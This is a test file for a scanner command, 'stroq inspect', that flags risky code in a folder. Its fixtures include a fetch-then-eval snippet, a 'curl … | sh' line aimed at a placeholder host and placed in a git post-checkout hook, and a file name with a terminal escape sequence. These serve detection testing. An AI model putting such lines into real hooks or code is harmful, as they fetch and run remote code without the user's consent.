import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { runInspect } from '../../src/commands/inspect.js';

// The fixtures are read and never run; the address cannot resolve.
const FETCHED =
  'function getCookie() {\n  fetch(u).then((r) => r.text()).then((t) => eval(t));\n}\n';
const FETCH_INTO_SHELL = 'curl -s https://stroq-test.invalid/x | sh';

const dirs: string[] = [];
afterEach(() => {
  vi.restoreAllMocks();
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true });
});

function folder(files: Readonly<Record<string, string>>, git = true): string {
  const dir = mkdtempSync(join(tmpdir(), 'stroq-inspect-code-'));
  dirs.push(dir);
  if (git)
    execFileSync('git', ['init', '-q', '.'], { cwd: dir, env: { ...process.env, HOME: dir } });
  for (const [path, body] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), body);
  }
  return dir;
}

function inspect(...argv: string[]): { code: number; out: string } {
  let out = '';
  vi.spyOn(process.stdout, 'write').mockImplementation((chunk) => {
    out += String(chunk);
    return true;
  });
  vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  const code = runInspect(argv);
  vi.restoreAllMocks();
  return { code, out };
}

describe('stroq inspect on the code of a folder', () => {
  it('points at the place, and leaves the exit code to what runs by itself', () => {
    const run = inspect(folder({ 'src/auth.js': FETCHED }));
    expect(run.code).toBe(0);
    expect(run.out).toContain('READ THIS BEFORE YOU RUN IT (1)');
    expect(run.out).toContain('src/auth.js:2  runs text it fetched or decoded as code');
    expect(run.out).not.toContain('Open it');
    expect(run.out).toContain('before you run anything from this folder');
  });

  it('a hook still fails the command, with the code listed too', () => {
    const dir = folder({ 'src/auth.js': FETCHED });
    mkdirSync(join(dir, '.git/hooks'), { recursive: true });
    writeFileSync(join(dir, '.git/hooks/post-checkout'), `#!/bin/sh\n${FETCH_INTO_SHELL}\n`, {
      mode: 0o755,
    });
    const run = inspect(dir);
    expect(run.code).toBe(1);
    expect(run.out).toContain('BEFORE YOU APPROVE ANYTHING');
    expect(run.out).toContain('READ THIS BEFORE YOU RUN IT (1)');
  });

  it('lists what is only worth a look apart from the rest', () => {
    const run = inspect(folder({ 'a.js': 'const v = eval(input);\n' }));
    expect(run.code).toBe(0);
    expect(run.out).not.toContain('READ THIS BEFORE YOU RUN IT');
    expect(run.out).toContain('ALSO WORTH A LOOK (1)');
    expect(run.out).toContain('a.js:1  runs text as code');
    expect(run.out).not.toContain('Reading found nothing to point at');
    expect(run.out).toContain('Nothing stronger than the places above was found');
    expect(run.out).toContain('does not make this folder safe');
  });

  it('nothing found is not said to be safe', () => {
    const run = inspect(folder({ 'a.js': 'run();\n' }));
    expect(run.code).toBe(0);
    expect(run.out).not.toContain('Open it');
    expect(run.out).toContain('Reading found nothing to point at');
    expect(run.out).toContain('does not make this folder safe');
    expect(run.out).not.toContain('NOT READ');
  });

  it('says what it did not read', () => {
    const run = inspect(folder({ 'node_modules/x/index.js': 'run();\n', 'a.js': 'run();\n' }));
    expect(run.out).toContain('NOT READ');
    expect(run.out).toContain('node_modules');
  });

  it('a folder with no git is read the same way', () => {
    const run = inspect(folder({ 'src/auth.js': FETCHED }, false));
    expect(run.out).toContain('src/auth.js:2  runs text it fetched or decoded as code');
  });

  it('gives the reading in JSON', () => {
    const run = inspect(folder({ 'src/auth.js': FETCHED, 'a.js': 'run();\n' }), '--json');
    const record = JSON.parse(run.out) as {
      code: readonly { kind: string; strength: string; file: string; line: number }[];
      codeNotRead: readonly string[];
      codeFilesRead: number;
    };
    expect(record.code).toEqual([
      { kind: 'fetched-text-runs', strength: 'strong', file: 'src/auth.js', line: 2 },
    ]);
    expect(record.codeNotRead).toEqual([]);
    expect(record.codeFilesRead).toBe(2);
  });

  it('keeps it out of SARIF, which a pull request check reads', () => {
    const run = inspect(folder({ 'src/auth.js': FETCHED }), '--sarif');
    expect(run.code).toBe(0);
    expect(run.out).not.toContain('fetched');
  });

  it('cuts a long list and says how many more', () => {
    const files: Record<string, string> = {};
    for (let i = 0; i < 60; i += 1) files[`f${String(i).padStart(2, '0')}.js`] = FETCHED;
    const run = inspect(folder(files));
    expect(run.out).toContain('READ THIS BEFORE YOU RUN IT (60)');
    expect(run.out).toContain('and 30 more');
  });

  it('a file name cannot move the terminal', () => {
    if (process.platform === 'win32') return;
    const run = inspect(folder({ 'a\u001b[2Jb.js': FETCHED }));
    expect(run.out).toContain('READ THIS BEFORE YOU RUN IT (1)');
    expect(run.out).not.toContain('\u001b');
  });
});
